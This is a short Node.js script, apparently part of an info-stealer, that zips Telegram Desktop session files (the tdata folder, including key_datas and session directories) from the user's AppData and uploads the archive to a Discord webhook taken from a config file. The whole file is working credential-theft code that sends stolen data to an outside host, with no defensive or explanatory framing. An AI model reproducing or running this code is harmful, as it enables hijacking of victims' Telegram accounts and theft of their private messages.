const fs = require("fs"),
  AdmZip = require("adm-zip"),
  Webhook = require("discord-webhook-node").Webhook,
  path = require("path"),
  telegramDir = path.join(
    process.env.USERPROFILE,
    "AppData",
    "Roaming",
    "Telegram Desktop",
    "tdata"
  ),
  outputDir = path.join(process.env.USERPROFILE, "AppData", "Local"),
  files = [
    "D877F783D5D3EF8C",
    "89C797EA40C6DC89s",
    "479FBDE978610A0As",
    "countries",
    "key_datas",
    "prefix",
    "settingss",
    "shortcuts-custom.json",
    "shortcuts-default.json",
    "usertag",
  ],
  zip = new AdmZip();
files.forEach((e) => {
  const i = path.join(telegramDir, e);
  fs.existsSync(i) &&
    (fs.statSync(i).isFile() ? zip.addLocalFile(i) : zip.addLocalFolder(i, e));
}),
  zip.writeZip(path.join(outputDir, "telegram_data.zip"));
const config = require("../config.json");
async function sendZipFile() {
  const e = new Webhook(config.webhook);
  await e.sendFile(path.join(outputDir, "telegram_data.zip"));
}
sendZipFile();
